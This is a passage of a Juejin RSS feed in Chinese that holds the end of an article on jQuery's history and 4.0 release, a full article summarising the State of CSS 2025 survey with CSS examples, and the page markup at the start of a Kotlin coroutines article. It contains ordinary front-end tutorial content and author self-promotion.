<li>托管服务商倾向于保持现有技术栈</li>
</ul>
<p>所以即使所有前端开发者都不再使用 jQuery，仅 WordPress 生态系统就能让它继续存在很多年。</p>
<h2 data-id="heading-8">9. 拥抱现代</h2>
<p>2026 年 1 月 17 日，<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FXhNEPf_5qbiM4W9HGgfzMQ" target="_blank" title="https://mp.weixin.qq.com/s/XhNEPf_5qbiM4W9HGgfzMQ" ref="nofollow noopener noreferrer">jQuery 4.0 正式发布</a>，在这次发布中：</p>
<ul>
<li><strong>移除对 IE11 以下版本的支持</strong>：摆脱历史包袱</li>
<li><strong>迁移到 ES 模块</strong>：与现代构建工具兼容</li>
<li><strong>增加 Trusted Types 支持</strong>：提升安全性</li>
<li><strong>移除已弃用 API</strong>：清理技术债务</li>
</ul>
<p>这次更新像是 jQuery 面向现代 Web 的断舍离。</p>
<h2 data-id="heading-9">10. 结语：一个时代的完结</h2>
<p>jQuery 20 年的发展史，就是一部前端技术的缩影。</p>
<p>它从解决现实问题出发，推动了整个行业的发展，最终也随着时代的变化而淡出主流。</p>
<p>这并不意味着 jQuery 是失败的。恰恰相反，<strong>它超额完成了自己的历史使命</strong>：</p>
<ul>
<li>它让无数人学会了前端开发</li>
<li>它推动了浏览器厂商的标准化</li>
<li>它催生了现代前端生态</li>
<li>它证明了开源协作的力量</li>
</ul>
<p>正如那句经典的台词：<strong>“并不是英雄迟暮，而是时代需要新的英雄。”</strong></p>
<p>jQuery 4.0 的发布不是回光返照，它告诉我们：<strong>技术没有绝对的对错，只有是否适合那个时代的需求</strong>。</p>
<p>今天，当我们在 React、Vue 的组件化世界中忙碌时，偶尔回望一下 jQuery 的简单优雅，也许能获得一些关于<strong>技术本质</strong>的思考：</p>
<p><strong>好的工具应该让人更专注于创造价值，而不是被技术本身所困扰。</strong></p>
<p>我是冴羽，10 年笔耕不辍，专注前端领域，更新了 10+ 系列、300+ 篇原创技术文章，翻译过 Svelte、Solid.js、TypeScript 文档，著有小册《Next.js 开发指南》、《Svelte 开发指南》、《Astro 实战指南》。</p>
<p>欢迎围观我的“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">网页版朋友圈</a>”，关注我的公众号：<strong>冴羽（或搜索 yayujs）</strong>，每天分享前端知识、AI 干货。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 年 CSS 年度调查报告亮点速览]]></title>    <link>https://juejin.cn/post/7596943803934670888</link>    <guid>https://juejin.cn/post/7596943803934670888</guid>    <pubDate>2026-01-20T03:04:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803934670888" data-draft-id="7596943803934621736" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 2025 年 CSS 年度调查报告亮点速览"/> <meta itemprop="keywords" content="前端,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-20T03:04:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             2025 年 CSS 年度调查报告亮点速览
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:04:01.000Z" title="Tue Jan 20 2026 03:04:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近日，「State of CSS 2025」年度调查报告公布。</p>
<p>这份报告收集了全球数万名开发者的真实使用经验和反馈，堪称是 Web 开发领域的“年度风向标”。</p>
<p>本篇我们盘点下这份报告的亮点部分。</p>
<h2 data-id="heading-0">1. 使用率最高的功能是 :has()</h2>
<p><strong>在调查的所有功能中，</strong><code>**:has()**</code><strong>是使用率最高也是最受欢迎的功能。</strong></p>
<p>想必大家已经很熟悉了，它是一个功能非常强大的伪类，可以实现类似“父选择器”和“前面兄弟选择器”的功能。</p>
<p>举个简单的例子，下面的 CSS 代码表示如果 <code>&lt;a&gt;</code> 元素里面有 <code>&lt;img&gt;</code> 元素，则这个 <code>&lt;a&gt;</code> 元素就会匹配。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">img</span>) {
  <span class="hljs-attribute">display</span>: block;
}
</code></pre>
<p>我们可以使用这个选择器轻松区分是文字链接还是图像链接，并设置不同的 CSS 样式。</p>
<h2 data-id="heading-1">2. 使用率第二高的功能是 aspect-ratio</h2>
<p>这个 CSS 属性允许你定义元素盒子的宽高比。</p>
<p>这意味着即使父容器或视口大小发生变化，浏览器也会调整元素的尺寸以保持指定的宽高比。</p>
<p>比如我们将一张图片设置为 3/2 宽高比：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">img</span> {
  aspect-ratio: <span class="hljs-number">3</span>/<span class="hljs-number">2</span>;
}
</code></pre>
<h2 data-id="heading-2">3. 使用率最低的是 sibling-count 和 sibling-index</h2>
<p>记得以前实现列表项交错动画时，要手动给每个元素设置不同的延迟吗？</p>
<p>现在，用 <code>sibling-index()</code> 一行代码就能搞定！</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">li</span> {
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span> ease;
  <span class="hljs-attribute">transition-delay</span>: <span class="hljs-built_in">calc</span>((<span class="hljs-built_in">sibling-index</span>() - <span class="hljs-number">1</span>) * <span class="hljs-number">100ms</span>);
}
</code></pre>
<p>这个函数会自动获取元素在兄弟节点中的位置（从 1 开始计数），通过简单的计算就能实现<strong>流畅的交错动画效果</strong>。</p>
<p>如果再搭配 <code>@starting-style</code>，连入场动画都能轻松搞定：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">li</span> {
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span> ease;
  <span class="hljs-attribute">transition-delay</span>: <span class="hljs-built_in">calc</span>((<span class="hljs-built_in">sibling-index</span>() - <span class="hljs-number">1</span>) * <span class="hljs-number">100ms</span>);

  <span class="hljs-keyword">@starting-style</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  }
}
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodepen.io%2Fargyleink%2Fpen%2FKwKXPYW" target="_blank" title="https://codepen.io/argyleink/pen/KwKXPYW" ref="nofollow noopener noreferrer">实现效果如下：</a></p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f1a4f0f145d4232a37913f620cc868d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=87sNHhi%2BWbIxUaBheGB0pwLtcRo%3D" alt="" loading="lazy"/></p>
<p>之所以使用率最低，可以理解，因为浏览器支持还比较新。</p>
<h2 data-id="heading-3">4. 受欢迎程度第二高的功能是 Subgrid</h2>
<p>Subgrid 表示子网格，它并不是一个 CSS 属性，而是 grid-template-columns 和 grid-template-rows 属性支持的关键字，其使用的场景需要外面已经有个 Grid 布局。</p>
<p>什么时候会用到 Subgrid 呢？</p>
<p>举个例子，这是一个布局效果：</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6e8b08e65a24a0f8a6f1db19000aab2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=iz0TkuOpABZCRaF5VU%2BjAYWKrkg%3D" alt="" loading="lazy"/></p>
<p>你会发现，标题字数不一样，内容字数不一样，导致底部很难对齐。</p>
<p>然而我们想要的效果是这样的：</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b50ee87a778a445e909c74b315cf7cc7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=n9xK2PPEkRShrOPWMdjSqgZEY%2FU%3D" alt="" loading="lazy"/></p>
<p>此时就可以用到 Subgrid，使用示例如下：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.wrapper</span> {
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}

<span class="hljs-selector-class">.item</span> {
  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span> / <span class="hljs-number">4</span>;
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-rows</span>: subgrid;
}
</code></pre>
<h2 data-id="heading-4">5. 认知度增长最高的是 light-dark()</h2>
<p>不知道你是否实现过网站的浅色和深色主题：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-comment">/* 默认浅色主题 */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#000</span>;
  <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#212121</span>;
  <span class="hljs-attr">--surface</span>: <span class="hljs-number">#efefef</span>;

  <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">prefers-color-scheme</span>: dark) {
    <span class="hljs-comment">/* 暗色主题 - 第一遍 */</span>
    <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#fff</span>;
    <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#efefef</span>;
    <span class="hljs-attr">--surface</span>: <span class="hljs-number">#212121</span>;
  }
}

<span class="hljs-selector-class">.dark-theme</span> {
  <span class="hljs-comment">/* 暗色主题 - 又写一遍！ */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#efefef</span>;
  <span class="hljs-attr">--surface</span>: <span class="hljs-number">#212121</span>;
}
</code></pre>
<p>同样的颜色写两遍，一个给媒体查询（自动切换），一个给切换按钮。</p>
<p>改一次要改两个地方，烦死了！</p>
<p>现在使用 <code>light-dark()</code> 轻松实现！</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-comment">/* 跟随系统偏好 */</span>
  <span class="hljs-attribute">color</span>-scheme: light dark;

  <span class="hljs-comment">/* 一次定义，自动切换 */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#000</span>, <span class="hljs-number">#fff</span>);
  <span class="hljs-attr">--text-body</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#212121</span>, <span class="hljs-number">#efefef</span>);
  <span class="hljs-attr">--surface</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#efefef</span>, <span class="hljs-number">#212121</span>);
}
</code></pre>
<p>就这么简单！系统是浅色就用第一个，暗色就用第二个。</p>
<h2 data-id="heading-5">6. 评论最多的功能是 line-clamp，多是负面评价</h2>
<p>CSS 属性 line-clamp 用于将容器的内容限制为指定的行数，也就是我们常实现的内容多时显示省略号的效果。</p>
<p>举个例子：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">p</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">display</span>: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: <span class="hljs-number">2</span>;
  <span class="hljs-attribute">overflow</span>: hidden;
}
</code></pre>
<p>效果如下：</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/105ce52fd632442aa0623d5c73e8eff5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=D5Mt8kShf1PSVoKu8BZRmNGjZf8%3D" alt="" loading="lazy"/></p>
<p>之所以被大家吐槽，多是因为技术局限性问题，比如：</p>
<ul>
<li>能限制行数，无法精确控制高度</li>
<li>浏览器兼容性还不够好</li>
<li>与动态内容配合困难：当文本内容长度不确定时，难以准确控制显示效果</li>
</ul>
<p>当我们实际使用 line-clamp 的时候，还要配合一系列属性比如 display、-webkit-box-orient、overflow、text-overflow，这种组合方案既复杂又不够语义化。</p>
<h2 data-id="heading-6">7. 结论</h2>
<p>CSS 这些年无疑在快速的发展中，而人们对 CSS 的满意度也在持续攀升。</p>
<p>引用报告中的一句话：</p>
<p><strong>“如果说 2025 年的主题是稳定不可能之事，那么 2026 年或许是实现期待已久的梦想之年。”</strong></p>
<p>对于热爱 CSS 的人来说，现在正是尝试、学习并参与塑造未来发展方向的最佳时机。</p>
<p>我是冴羽，10 年笔耕不辍，专注前端领域，更新了 10+ 系列、300+ 篇原创技术文章，翻译过 Svelte、Solid.js、TypeScript 文档，著有小册《Next.js 开发指南》、《Svelte 开发指南》、《Astro 实战指南》。</p>
<p>欢迎围观我的“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">网页版朋友圈</a>”，关注我的公众号：<strong>冴羽（或搜索 yayujs）</strong>，每天分享前端知识、AI 干货。</p>
<p>新的一年，如果你想快速改变自己，欢迎加入我的知识星球：“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2Fcourse%3Fto%3Dzsxq" target="_blank" title="https://yayujs.com/course?to=zsxq" ref="nofollow noopener noreferrer">冴羽·前端大佬成长之路</a>”，10 年工作总结、100+ 篇精华主题、70W 字原创内容，带你升级认知、重构生活、建立知识管理系统、通关面试、引领职场。用一年时间，实现十倍成长，一鸣惊人。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin 协程-基础篇]]></title>    <link>https://juejin.cn/post/7597125475601629211</link>    <guid>https://juejin.cn/post/7597125475601629211</guid>    <pubDate>2026-01-20T10:26:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475601629211" data-draft-id="7596874392824873002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin 协程-基础篇"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-20T10:26:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jony_"/> <meta itemprop="url" content="https://juejin.cn/user/3403743732709767"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin 协程-基础篇
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3403743732709767/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jony_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:26:21.000Z" title="Tue Jan 20 2026 10:26:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 